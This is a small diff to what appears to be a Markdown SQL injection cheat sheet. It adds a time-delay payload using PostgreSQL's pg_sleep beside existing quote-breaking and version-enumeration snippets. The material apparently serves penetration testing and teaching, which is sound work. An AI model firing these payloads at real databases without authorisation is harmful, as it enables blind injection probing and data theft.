@@ -52,6 +52,11 @@ SELECT * FROM users WHERE id='
 '
 ```
 
+### time delay
+```
+SELECT pg_sleep(10); -- PostgreSQL
+```
+
 # Version enumeration
 ```
 SELECT version() # PostgreSQL / MySQL / MariaDB
